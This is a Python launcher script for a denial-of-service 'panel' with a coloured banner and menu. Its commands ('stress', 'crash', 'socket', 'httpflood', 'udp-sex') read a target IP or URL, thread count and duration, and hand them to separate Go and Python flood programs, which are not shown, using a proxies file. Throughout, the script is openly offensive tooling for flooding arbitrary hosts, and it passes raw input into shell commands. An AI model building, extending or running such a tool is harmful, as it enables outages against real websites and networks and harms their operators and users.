#Coc Hy Hung 2008-Dev

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)
def menu():
    sys.stdout.write(f"         \x1b]2;FACEBOOK: fb.com/CocHyHung.Facebook.Information\x07")
    clear()
    print("")
    print("""\033[35m                
\033[35m                           🤡 Dang Duc Tri \033[31mX \033[32mCoc Hy Hung 🤡

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║ \033[32mcrash \033[36m- \033[32mcrash Flood \033[35m     ║ \033[32mstress \033[36m- \033[32mL7 + L4 Flood \033[35m    ║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[32mhttpflood \033[36m- \033[32mHTTP-FLOOD \033[35m║ ║ \033[32mudp-sex \033[36m - \033[32mUDP METHOD   \033[35m ║
\033[35m             ║ \033[32msocket\033[36m   - \033[32mSOCKET-FLOOD\033[35m║ ║ \033[32mnone \033[36m - \033[32mUpdate later    \033[35m ║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[32mCredits: HungGen3\033[93m: \033[31mMETHOD: powerful layer7 methods \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
""")
    

def main():
    menu()
    while(True):
        nicknm = "user"
        cnc = input("\033[32m[\033[35m{}\033[32m@Powered]\033[36m$ \033[96m".format(nicknm)).lower()
        if cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()

# LAYER 7 METHODS   

# SPECIAL METHODS

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
# AMP/GAMES METHODS

        

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run crash.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "socket" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                os.system(f'go run socket.go {url}  {threads}')
            except IndexError:
                print('Usage: socket <url> <THREADS>')
                print('Example: socket http://example.com 120')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run http.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')
        elif "udp-sex" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                duration = cnc.split()[3]
                os.system(f'py udp.py {ip} {port} {duration} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port> <duration>')
                print('Example: udp 1.1.1.1 80 102')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass

main()